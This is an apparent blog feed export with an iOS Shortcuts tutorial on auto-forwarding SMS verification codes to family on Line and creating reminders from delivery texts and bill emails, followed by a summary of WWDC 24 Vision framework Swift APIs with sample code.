Shortcut (formerly known as Workflow) is a new feature introduced in iOS 12; it allows users to create a series of tasks that can be executed with one tap and set to trigger automatically in the background.Besides the built-in Shortcuts feature in iOS, Apple has also opened Siri Shortcut / App Intents to developers in recent years, allowing third-party apps to include some functions in Shortcuts for users to combine and use.The automatic execution conditions are currently limited to iOS itself or its own apps, such as: specific times, arriving at or leaving a location, detecting NFC, receiving messages, emails, or connecting to Wi-Fi, battery level, Do Not Disturb mode, detecting sounds, and so on.Apple‚Äôs own services do not require jailbreaking like early SMS forwarding; the Shortcuts feature works without jailbreaking or installing strange third-party apps. There are already many online resources explaining how to use Shortcuts and providing ready-made scripts, so this article will not go into detail. iOS‚Äôs cross-device message forwarding feature (Settings -&gt; Messages -&gt; Text Message Forwarding) only works for devices using the same Apple ID, so we need to use Shortcuts to forward specific messages for us. This article only introduces 3 practical, convenient, and simple use cases that I find very useful.Scenario 1 ‚Äî Automatic SMS ForwardingIn an era full of scam text messages, there is a real fear that elderly family members or children might receive scam messages and accidentally enter information, leading to fraud. Additionally, elders may not understand the process of verifying account security via text messages and may need remote assistance to receive texts and complete verification. There‚Äôs also concern about children using phones for unauthorized activities.https://branch.taipower.com.tw/d112/xmdoc/cont?xsmsid=0M242581319225466606&amp;sid=0N209616847897374705EffectSet the conditions as follows: When receiving an SMS containing ‚Äúhttp,‚Äù forward the message ‚Äúcontent‚Äù to me on Line. When receiving an SMS containing ‚ÄúÈÄöÁü•,‚Äù forward the message ‚ÄúÂÖßÂÆπ‚Äù to me on Line. When receiving a text message containing ‚Äúverification code,‚Äù forward the message ‚Äúcontent‚Äù to me on Line. When receiving an SMS containing ‚Äúverification code,‚Äù forward the message ‚Äúcontent‚Äù to me on Line. Testing shows that sending works correctly even when the phone is locked and on standby.Setup Method1. Install &amp; Open the Shortcuts App2. Switch to the ‚ÄúAutomation‚Äù tab, tap the ‚Äú+‚Äù at the top right, and scroll down to find ‚ÄúMessages‚Äù3. Set Message Conditions ‚ÄúMessage contains‚Äù: http ( = All messages with URLs will be forwarded )Create separate shortcuts for multiple keywords. \"Confirm and Execute\" changed to \"Execute Immediately\" Click „ÄåNext„Äç When ‚Äî Other Settings: ‚ÄúSender‚Äù: Multiple, but must be added to contacts ‚ÄúAt least one of the two conditions, ‚ÄòMessage Contains‚Äô or ‚ÄòSender,‚Äô must be set, so it is not possible to handle all messages without setting any condition.‚Äù 4. Add Automation Actions Choose „ÄåCreate Blank Automation„Äç If you want to forward to Line messages, enter „Äåline„Äç in the search box to find the shortcut feature provided by Line, then select Line‚Äôs „ÄåSend Message„Äç and choose the target you want to send to. Here, only the four most recent chat contacts or groups will appear. If your target does not show up, you can first go back to Line and send a few messages to the target contact or group, then come back and it will appear. The feature to select phone numbers from contacts for sending messages in Line is not working. Similarly, you can also use the ‚ÄúSend Message‚Äù or ‚ÄúSend Email‚Äù actions (as shown in the third image) to forward the received message content to SMS (if iCloud Messages is not enabled, SMS fees may apply) or Email.After Adding a Recipient First, click Send \"Message\" to \"XXX\", then the \"Message\" input box. Swipe right to find &amp; click „ÄåShortcut Input„Äç Go back to the top and click the ‚ÄúShortcut Input‚Äù sent to ‚ÄúXXX‚Äù section‚Äôs ‚ÄúShortcut Input‚Äù input box. Exit the menu below and change the original selection from „ÄåË®äÊÅØ„Äç to „ÄåÂÖßÂÆπ„Äç Click the ‚ÄúX‚Äù next to the menu to close Click ‚ÄúDone‚Äù at the top right corner If you want to change the recipient to XXX, first click the X on the right to remove the entire Line action, then add a new Line message action with the new recipient. Confirm the final setting result as:When I receive a message containing \"XXX\", take the message as input and Line will send the \"content\" to \"XXX\" No problem, tap ‚ÄúDone‚Äù at the top right corner.If tapping Done does nothing, it might be an iOS bug. You can ignore it and just tap Back to return to the home page. Return to the Shortcuts automation homepage to view, pause, or edit this shortcut. Done!As long as you wait for new messages to arrive, those containing the specified keywords will be automatically forwarded (even if the phone is locked). Due to current feature limitations, each keyword requires a separate shortcut, and if the same message contains multiple keywords, it will be sent twice.Scenario 2 ‚Äî Automatically Create Reminder To-Do When Package Arrives at Convenience StoreI currently use Apple‚Äôs built-in Reminders app to manage my daily to-do tasks, so I also want to integrate other reminders I need, such as package deliveries to convenience stores, credit card payment notifications, and so on.EffectSet the conditions as follows: Add a reminder when the SMS contains ‚ÄúÂ∑≤Âú®‚Äù (Coupang uses ‚ÄúÂ∑≤Âú®‚Äù) Add a reminder when receiving an SMS containing ‚ÄúDelivered‚Äù (usually ‚ÄúDelivered‚Äù) Setup Method1. Install &amp; Open the Shortcuts App2. Switch to the ‚ÄúAutomation‚Äù tab, tap the ‚Äú+‚Äù at the top right, and scroll down to find ‚ÄúMessages‚Äù3. Set Message ConditionsFollowing the previous introduction of automatic SMS forwarding conditions, here set Message content contains \"delivered\" and change to \"Execute immediately\".4. Add Automation Actions &amp; Set Reminder TimeFirst, we need to set the reminder‚Äôs due date by creating a date variable that calculates the time from when the message is received plus the desired reminder interval. Choose „ÄåCreate a Blank Automation„Äç Search for „ÄåË™øÊï¥Êó•Êúü„Äç in the box below. Choose „ÄåAdjust Date„Äç Select the input box for ‚ÄúDate‚Äù in the option Add 0 seconds to \"Date\" Select the variable below and choose „ÄåCurrent Date„Äç Change the „Äåseconds„Äç input box of the option Add 0 \"seconds\" to „Äådays„Äç. Enter the number of days before expiration you want to be reminded. Here, I enter 3 days. Click the ‚ÄúX‚Äù next to the menu to close it 5. Add Reminder Action In the search bar, type „ÄåReminder„Äç, scroll down to find &amp; click „ÄåAdd Reminder„ÄçAfter adding ‚ÄúAdd Reminder‚Äù First, click the first „ÄåÊèêÈÜí‰∫ãÈ†Ö„Äç input box in Add \"Reminders\" to \"Reminders\" without prompting. Swipe right to find and tap „ÄåÊç∑ÂæëËº∏ÂÖ•„Äç Click the ‚ÄúShortcut Input‚Äù input box in Add ‚ÄúShortcut Input‚Äù to ‚ÄúReminders‚Äù without prompt Open the dropdown menu below and change the original selection from „ÄåË®äÊÅØ„Äç to „ÄåÂÖßÂÆπ„Äç Click the ‚ÄúX‚Äù next to the menu to close 6. Set Reminder Notifications Change „ÄåNo Prompt„Äç to „ÄåPrompt„Äç Select the „Äå2:00 PM„Äç input box at time 2:00 PM, then choose the variable „ÄåAdjusted Date„Äç Click the ‚ÄúX‚Äù next to the menu to close it After confirming everything is fine, tap ‚ÄúDone‚Äù at the top right corner.If tapping Done has no response, it might be an iOS bug. You can ignore it and just tap back to return to the home page. Returning to the Shortcuts automation homepage lets you view, pause, and edit this shortcut.Done!As mentioned earlier, just wait for new messages to arrive. If they contain the specified keywords, reminders will be automatically created (even if the phone is locked). Due to current functionality limitations, each keyword requires a separate shortcut, so if one message contains multiple keywords, reminders will be created multiple times.Scenario 3 ‚Äî Automatically Create Reminder To-Do When Receiving Credit Card Bill EmailAnother life notification is the credit card bill alert; set it up like an SMS, so when an email is received, it can also trigger a shortcut automation to add a reminder. However, since automation features are not yet available to third-party apps, it can only be triggered using Apple‚Äôs Mail App.EffectSet the conditions as follows: Add Reminder When Email Subject Contains ‚ÄúCredit Card Statement‚Äù Please note that each company has different formats Orz, some call it ‚ÄúCredit Card Electronic Statement,‚Äù others ‚ÄúCredit Card Electronic Reconciliation Statement,‚Äù and Cathay goes further with ‚ÄúCredit Card XXXX Year X Month Electronic Statement‚Äù Because Regex is not supported temporarily, only text matching can be used. As mentioned above, each keyword requires adding a new shortcut.1. Make sure you have installed the Mail App and completed mailbox account login (Gmail is also supported)2. Confirm Email Retrieval SettingsConfirm that ‚ÄúSettings‚Äù -&gt; ‚ÄúMail‚Äù -&gt; ‚ÄúAccounts‚Äù -&gt; ‚ÄúFetch New Data‚Äù is set to Fetch or Push.3. Install &amp; Open the Shortcuts App4. Switch to the ‚ÄúAutomation‚Äù tab, select the ‚Äú+‚Äù at the top right, and scroll down to find ‚ÄúEmail‚Äù3. Set Email Conditions ‚ÄúTitle contains‚Äù: credit card statement Create multiple shortcuts separately for multiple keywords. Change ‚ÄúÁ¢∫Ë™çÂæåÂü∑Ë°å‚Äù to Execute Immediately Click ‚ÄúNext‚Äù When ‚Äî Other Settings: ‚ÄúSender‚Äù: Multiple, but must be added to contacts Other Filter Criteria ‚Äî Account: Can filter sources from iCloud or Gmail Other filter conditions ‚Äî Recipients: multiple, but must be added to contacts, usually your own multiple accounts 4. Add Automation Actions &amp; Set Reminder TimeFirst, set the due date for the reminder. Add a date variable to calculate the reminder time by adding the desired duration to the time the message is received. Choose ‚ÄúAdd Blank Automation‚Äù Search for „ÄåAdjust Date„Äç in the box below. Select „ÄåAdjust Date„Äç Select the input box for ‚ÄúDate‚Äù in the option Add 0 seconds to \"Date\" Select the variable below, choose „ÄåCurrent Date„Äç Add 0 \"seconds\" change \"seconds\" to \"days\" Enter the number of days before expiration you want to be reminded. Here, I enter 3 days. Click the ‚ÄúX‚Äù next to the menu to close it 5. Set Up Email FiltersTriggering differs for each message. Email triggers work by batch retrieval, so if any email in that batch contains the keyword in the subject, all those new emails will be sent together. Not sure if this is a Shortcuts bug, but this is the result anyway.Example: Batch capture three emails, including a Carrefour notification, a credit card statement, and an Uber notification. All three will be input into our shortcut; therefore, we need an additional step to filter out the emails with the keywords we want.Virtual Logic:for email_subject in emails if email_subject.contain(\"credit card statement\") then add_reminder else end end In the search box, type „ÄåRepeat„Äç, scroll down and click „ÄåRepeat Each„Äç. After adding, it will grab the wrong variable. In the ‚ÄúRepeat Each Item in Adjusted Dates‚Äù action, select the ‚ÄúAdjusted Dates‚Äù input box and choose ‚ÄúClear Variable.‚Äù After clearing, select the input box for ‚ÄúItems‚Äù in ‚ÄúRepeat Each Item,‚Äù and choose ‚ÄúShortcut Input.‚Äù In the search box, type „ÄåÂ¶ÇÊûú„Äç, scroll down to find &amp; click „ÄåÂ¶ÇÊûú„Äç At this time, the position will be incorrect Drag the If \"Repeat Result\" \"Condition\" action below (inside) Repeat with Each Item in \"Shortcut Input\" Confirm the final location map as shown in Figure 2 above. If incorrect, please delete duplicates and redo the previous step. Click the Duplicate Result input box under Duplicate Result &gt; Status, then change the selection below to Title. Click the ‚ÄúX‚Äù next to the menu to close it. Click the Title input box under If \"Title\" \"Condition\", change the selection to Contains, enter Credit Card Statement, and tap the keyboard‚Äôs ‚ÄúDone‚Äù.6. Set Up Email Filters In the search bar, type ‚ÄúReminder,‚Äù scroll down to find and click ‚ÄúAdd Reminder.‚Äù At this time, the position will still be incorrect. Drag the action Add \"Reminders\" to \"Reminders\" and \"Do Not Notify\" under If \"Title\" \"Contains\" \"Credit Card Bill\" (inside) Confirm the final location map as shown in Figure 3 above. If incorrect, please delete duplicates and redo the previous step. After adding ‚ÄúAdd Reminder‚Äù Click the first „ÄåÊèêÈÜí‰∫ãÈ†Ö„Äç input box in Add \"Reminder\" to \"Reminders\" and \"Do Not Prompt\". Swipe right to find &amp; click „ÄåDuplicate Items„Äç Go back to the top and click the Duplicate Items input box, then change the originally selected Email to Title. Click the ‚ÄúX‚Äù next to the menu to close it 6. Set Reminder Prompt Change „ÄåNo Prompt„Äç to „ÄåPrompt„Äç Select the input box „Äå2:00 PM„Äç at Time 2:00 PM, then choose the variable „ÄåAdjusted Date„Äç Click the ‚ÄúX‚Äù next to the menu to close it No problem, tap ‚ÄúDone‚Äù at the top right corner.If tapping Done does nothing, it might be an iOS bug. You can ignore it and just tap Back to return to the home page. Return to the Shortcuts automation homepage to view, pause, or edit this shortcut.Done!Email settings are relatively more complex because batch retrieval requires an additional filtering step, followed by creating reminders based on the filtered results. When a new email arrives and Apple Mail finishes fetching it, if the subject contains a credit card statement, it will automatically create one! Because Apple Mail uses fetching (if not iCloud), email retrieval is not instantaneous and will be delayed for a while. OthersThe shortcut automation will show a notification after execution, and this notification cannot be disabled.EndSeveral basic automation integration features have been completed, saving you effort in just a few simple steps; other advanced integrations, such as API connections to Notion or more complex setups, are also technically achievable. What‚Äôs lacking is not the technology but your imaginative automation ideas!Other Automation Further Reading Automate Google Services RPA with Google Apps Script Forward Gmail Messages to Slack Using Google Apps Script If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Vision FrameworkÔΩúExplore Swift API Enhancements from WWDC 24 Session", "url": "/posts/kkday-tech-blog/ios-vision-framework-explore-swift-api-enhancements-from-wwdc-24-session-755509180ca8/", "categories": "KKday Tech Blog", "tags": "english, ai-translation, ios-app-development, vision-framework, apple-intelligence, ai, machine-learning", "date": "2024-08-13 16:10:37 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision frame...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework SessionVision framework Feature Review &amp; iOS 18 New Swift API Hands-onPhoto by BoliviaInteligenteTopicThe relationship with Vision Pro is like that between a hot dog and a dog‚Äîcompletely unrelated.Vision frameworkVision framework is Apple‚Äôs integrated machine learning image recognition framework, allowing developers to easily and quickly implement common image recognition features. The Vision framework was first introduced in iOS 11.0+ (2017/iPhone 8) and has been continuously improved and optimized. It has enhanced integration with Swift Concurrency to boost performance, and starting from iOS 18.0, it offers a new Swift Vision framework API to fully leverage Swift Concurrency.Features of the Vision Framework Built-in Numerous Image Recognition and Motion Tracking Methods (A Total of 31 Types up to iOS 18) On-Device uses only the phone‚Äôs chip for computation. The recognition process does not rely on cloud services, making it fast and secure. API is simple and easy to use Apple platforms all support iOS 11.0+, iPadOS 11.0+, Mac Catalyst 13.0+, macOS 10.13+, tvOS 11.0+, visionOS 1.0+ Published for many years (2017~present) and continuously updated Integrating Swift Language Features to Enhance Computational Performance Played around 6 years ago: Vision Introduction ‚Äî APP Avatar Upload Automatic Face Recognition and Cropping (Swift) This time, paired with WWDC 24 Discover Swift enhancements in the Vision framework Session, I reviewed and explored again with the new Swift features.CoreMLApple also has another framework called CoreML, which is an on-device chip-based machine learning framework. It allows you to train your own models for recognizing objects or documents and embed the models directly into your app. Interested users can try it out. (e.g. real-time article classification, real-time spam detection ‚Ä¶)p.s.Vision v.s. VisionKit: Vision : Mainly used for image analysis tasks like face recognition, barcode detection, and text recognition. It offers powerful APIs to process and analyze visual content in still images or videos. VisionKit : Specifically designed for handling document scanning tasks. It provides a scanner view controller that can be used to scan documents and generate high-quality PDFs or images.Vision framework cannot run on the simulator for M1 models and can only be tested on real devices; running in the simulator environment throws a Could not create Espresso context error. Checking the official forum discussion, no solution was found. Since I do not have a physical iOS 18 device for testing, all the results in this article are based on the old (pre-iOS 18) methods; please leave a comment if there are errors with the new methods.WWDC 2024 ‚Äî Discover Swift enhancements in the Vision frameworkDiscover Swift enhancements in the Vision framework This article summarizes WWDC 24 ‚Äî Discover Swift enhancements in the Vision framework session, including some personal experimentation notes.Introduction ‚Äî Vision framework FeaturesFacial Recognition and Contour DetectionImage Text RecognitionAs of iOS 18, it supports 18 languages.// List of supported languagesif #available(iOS 18.0, *) { print(RecognizeTextRequest().supportedRecognitionLanguages.map { \"\\($0.languageCode!)-\\(($0.region?.identifier ?? $0.script?.identifier)!)\" })} else { print(try! VNRecognizeTextRequest().supportedRecognitionLanguages())}// The actual available recognition languages are based on this.// Tested on iOS 18, the output is:// [\"en-US\", \"fr-FR\", \"it-IT\", \"de-DE\", \"es-ES\", \"pt-BR\", \"zh-Hans\", \"zh-Hant\", \"yue-Hans\", \"yue-Hant\", \"ko-KR\", \"ja-JP\", \"ru-RU\", \"uk-UA\", \"th-TH\", \"vi-VT\", \"ar-SA\", \"ars-SA\"]// Swedish mentioned at WWDC was not seen, unsure if it's not released yet or related to device region/language settingsDynamic Motion Capture Can achieve dynamic tracking of people and objects Gesture capture enables air signature functionality What‚Äôs new in Vision? (iOS 18)‚Äî Image rating feature (quality, memorability) Can calculate a score for the input image, making it easy to filter high-quality photos. The scoring method includes multiple dimensions, not only image quality but also lighting, angle, subject, whether it evokes memorable points, and more. WWDC provided the above three images for illustration (under the same image quality), which are: High-Quality Images: Composition, Lighting, and Memorable Elements Low-Quality Images: No clear subject, appear to be taken casually or accidentally Image Material: Technically well taken but lacks memorable elements, resembling stock photos used for material libraries. iOS ‚â• 18 New API: CalculateImageAestheticsScoresRequestlet request = CalculateImageAestheticsScoresRequest()let result = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!)// Photo scoreprint(result.overallScore)// Whether it is classified as a utility imageprint(result.isUtility)What‚Äôs new in Vision? (iOS 18) ‚Äî Simultaneous Body and Hand Gesture DetectionPreviously, only individual detection of body pose and hand pose was possible. This update allows developers to detect both body pose and hand pose simultaneously, combining them into a single request and result, making it easier to develop more application features.iOS ‚â• 18 New API: DetectHumanBodyPoseRequestvar request = DetectHumanBodyPoseRequest()// Also detect hand posesrequest.detectsHands = trueguard let bodyPose = try await request.perform(on: image).first else { return }// Body pose jointslet bodyJoints = bodyPose.allJoints()// Left hand pose jointslet leftHandJoints = bodyPose.leftHand.allJoints()// Right hand pose jointslet rightHandJoints = bodyPose.rightHand.allJoints()New Vision APIApple has provided a new Swift Vision API wrapper for developers in this update. Besides supporting the original features, it mainly enhances Swift 6 and Swift Concurrency capabilities, offering better performance and a more Swift-friendly API usage.Get started with VisionHere, the speaker reintroduced the basic usage of the Vision framework. Apple has already packaged 31 types (as of iOS 18) of common image recognition requests called ‚ÄúRequest‚Äù and their corresponding returned ‚ÄúObservation‚Äù objects. Request: DetectFaceRectanglesRequest Face region detection requestResult: FaceObservationThe previous article ‚ÄúVision Introduction ‚Äî APP Profile Picture Upload Automatic Face Crop Recognition (Swift)‚Äù used this pair of requests. Request: RecognizeTextRequest text recognition requestResult: RecognizedTextObservation Request: GenerateObjectnessBasedSaliencyImageRequest Main Object Recognition RequestResult: SaliencyImageObservation All 31 Types of Requests: Request:VisionRequest.\\| Request Purpose \\| Observation Description \\|\\|‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì\\|‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî\\|\\| CalculateImageAestheticsScoresRequestCalculate the aesthetic score of an image. \\| AestheticsObservationReturns the aesthetic scores of the image, such as composition and color. \\|\\| ClassifyImageRequestClassify image content. \\| ClassificationObservationReturns classification labels and confidence for objects or scenes in the image. \\|\\| CoreMLRequestAnalyze image using a Core ML model. \\| CoreMLFeatureValueObservationGenerates observations based on the Core ML model output. \\|\\| DetectAnimalBodyPoseRequestDetect animal poses in the image. \\| RecognizedPointsObservationReturns the animal‚Äôs skeleton points and their positions. \\|\\| DetectBarcodesRequestDetect barcodes in the image. \\| BarcodeObservationReturns barcode data and type (e.g., QR code). \\|\\| DetectContoursRequestDetect contours in the image. \\| ContoursObservationReturns detected contour lines in the image. \\|\\| DetectDocumentSegmentationRequestDetect and segment documents in the image. \\| RectangleObservationReturns the rectangular boundary of the document. \\|\\| DetectFaceCaptureQualityRequestEvaluate face capture quality. \\| FaceObservationReturns quality assessment scores of the face image. \\|\\| DetectFaceLandmarksRequestDetect facial landmarks. \\| FaceObservationReturns detailed positions of facial landmarks (e.g., eyes, nose). \\|\\| DetectFaceRectanglesRequestDetect faces in the image. \\| FaceObservationReturns bounding boxes of faces. \\|\\| DetectHorizonRequestDetect horizon in the image. \\| HorizonObservationReturns the angle and position of the horizon. \\|\\| DetectHumanBodyPose3DRequestDetect 3D human body poses in the image. \\| RecognizedPointsObservationReturns 3D human skeleton points and their spatial coordinates. \\|\\| DetectHumanBodyPoseRequestDetect human body poses in the image. \\| RecognizedPointsObservationReturns human skeleton points and their coordinates. \\|\\| DetectHumanHandPoseRequestDetect hand poses in the image. \\| RecognizedPointsObservationReturns hand skeleton points and their positions. \\|\\| DetectHumanRectanglesRequestDetect humans in the image. \\| HumanObservationReturns bounding boxes of humans. \\|\\| DetectRectanglesRequestDetect rectangles in the image. \\| RectangleObservationReturns coordinates of the four vertices of rectangles. \\|\\| DetectTextRectanglesRequestDetect text regions in the image. \\| TextObservationReturns the position and bounding boxes of text areas. \\|\\| DetectTrajectoriesRequestDetect and analyze object motion trajectories. \\| TrajectoryObservationReturns trajectory points and their time sequences. \\|\\| GenerateAttentionBasedSaliencyImageRequestGenerate attention-based saliency images. \\| SaliencyImageObservationReturns saliency maps of the most attractive areas in the image. \\|\\| GenerateForegroundInstanceMaskRequestGenerate foreground instance mask images. \\| InstanceMaskObservationReturns masks of foreground objects. \\|\\| GenerateImageFeaturePrintRequestGenerate image feature prints for comparison. \\| FeaturePrintObservationReturns feature print data of the image for similarity comparison. \\|\\| GenerateObjectnessBasedSaliencyImageRequestGenerate objectness-based saliency images. \\| SaliencyImageObservationReturns saliency maps of objectness areas. \\|\\| GeneratePersonInstanceMaskRequestGenerate person instance mask images. \\| InstanceMaskObservationReturns masks of person instances. \\|\\| GeneratePersonSegmentationRequestGenerate person segmentation images. \\| SegmentationObservationReturns binary masks for person segmentation. \\|\\| RecognizeAnimalsRequestDetect and recognize animals in the image. \\| RecognizedObjectObservationReturns animal types and confidence levels. \\|\\| RecognizeTextRequestDetect and recognize text in the image. \\| RecognizedTextObservationReturns detected text content and its region location. \\|\\| TrackHomographicImageRegistrationRequestTrack homographic image registration. \\| ImageAlignmentObservationReturns homography transformation matrices between images for registration. \\|\\| TrackObjectRequestTrack objects in the image. \\| DetectedObjectObservationReturns object positions and velocity information in the image. \\|\\| TrackOpticalFlowRequestTrack optical flow in the image. \\| OpticalFlowObservationReturns optical flow vector fields describing pixel movements. \\|\\| TrackRectangleRequestTrack rectangles in the image. \\| RectangleObservationReturns position, size, and rotation angle of rectangles in the image. \\|\\| TrackTranslationalImageRegistrationRequestTrack translational image registration. \\| ImageAlignmentObservationReturns translation transformation matrices between images for registration. \\| Adding VN in front indicates the old API usage (versions before iOS 18).The speaker mentioned several commonly used Requests, as follows.ClassifyImageRequestIdentify the input image to obtain label categories and confidence levels.[Travelogue] 2024 Second Visit to Kyushu: 9-Day Independent Trip, Entering via Busan ‚Üí Hakata Cruiseif #available(iOS 18.0, *) { // New API using Swift features let request = ClassifyImageRequest() Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!) observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old approach let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNClassificationObservation] else { return } observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } let request = VNClassifyImageRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*3_jdrLurFuUfNdW4BJaRww.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results: ‚Ä¢ outdoor: 0.75392926 ‚Ä¢ sky: 0.75392926 ‚Ä¢ blue_sky: 0.7519531 ‚Ä¢ machine: 0.6958008 ‚Ä¢ cloudy: 0.26538086 ‚Ä¢ structure: 0.15728651 ‚Ä¢ sign: 0.14224191 ‚Ä¢ fence: 0.118652344 ‚Ä¢ banner: 0.0793457 ‚Ä¢ material: 0.075975396 ‚Ä¢ plant: 0.054406323 ‚Ä¢ foliage: 0.05029297 ‚Ä¢ light: 0.048126098 ‚Ä¢ lamppost: 0.048095703 ‚Ä¢ billboards: 0.040039062 ‚Ä¢ art: 0.03977703 ‚Ä¢ branch: 0.03930664 ‚Ä¢ decoration: 0.036868922 ‚Ä¢ flag: 0.036865234....omittedRecognizeTextRequestRecognize the text content in images. (a.k.a. Image to Text)[Travelogue] 2023 Tokyo 5-Day Independent Tripif #available(iOS 18.0, *) { // New API using Swift features var request = RecognizeTextRequest() request.recognitionLevel = .accurate request.recognitionLanguages = [.init(identifier: \"ja-JP\"), .init(identifier: \"en-US\")] // Specify language code, e.g., Traditional Chinese Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!) observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old approach let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let request = VNRecognizeTextRequest(completionHandler: completionHandler) request.recognitionLevel = .accurate request.recognitionLanguages = [\"ja-JP\", \"en-US\"] // Specify language code, e.g., Traditional Chinese DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:LE LABO Aoyama StoreTEL:03-6419-7167ÔºäThank you for your purchase*No: 21347Date: 2023/06/10 14:14:57Staff:1690370Register: 008A 1Product NamePrice Including Tax Quantity Total Including TaxKaiak 10 EDP FB 15MLJ1P7010000S16,80016,800Another 13 EDP FB 15MLJ1PJ010000S10,70010,700Lip Balm 15MLJOWC010000S2,0001Total Amount(Tax Included)CARD2,0003 items purchased29,500029,50029,500DetectBarcodesRequestDetect barcode and QR code data in images.Locally Recommended White Flower Embrocation in Thailandlet filePath = Bundle.main.path(forResource: \"IMG_6777\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features let request = DetectBarcodesRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old approach let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } observations.forEach { observation in print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:Payload: 8859126000911Symbology: VNBarcodeSymbologyEAN13Payload: https://lin.ee/hGynbVMSymbology: VNBarcodeSymbologyQRPayload: http://www.hongthaipanich.com/Symbology: VNBarcodeSymbologyQRPayload: https://www.facebook.com/qr?id=100063856061714Symbology: VNBarcodeSymbologyQRRecognizeAnimalsRequestIdentify the animal in the image and its confidence level.meme Sourcelet filePath = Bundle.main.path(forResource: \"IMG_5026\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features let request = RecognizeAnimalsRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } catch { print(\"Request failed: \\(error)\") } }} else { // Old approach let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedObjectObservation] else { return } observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } let request = VNRecognizeAnimalsRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:Detected animal: Cat with confidence: 0.77245045Others: Detecting Human Figures in Images: DetectHumanRectanglesRequest Detect poses of humans and animals (3D or 2D): DetectAnimalBodyPoseRequest, DetectHumanBodyPose3DRequest, DetectHumanBodyPoseRequest, DetectHumanHandPoseRequest Detect and track the movement trajectory of objects (in different frames of videos or animations): DetectTrajectoriesRequest, TrackObjectRequest, TrackRectangleRequest iOS ‚â• 18 Update Highlight:VN*Request -&gt; *Request (e.g. VNDetectBarcodesRequest -&gt; DetectBarcodesRequest)VN*Observation -&gt; *Observation (e.g. VNRecognizedObjectObservation -&gt; RecognizedObjectObservation)VNRequestCompletionHandler -&gt; async/awaitVNImageRequestHandler.perform([VN*Request]) -&gt; *Request.perform()WWDC ExampleWWDC official video uses a supermarket barcode scanner as an example.First, most products have barcodes available for scanningWe can get the barcode location from observation.boundingBox, but unlike the common UIView coordinate system, the origin of boundingBox is at the bottom-left 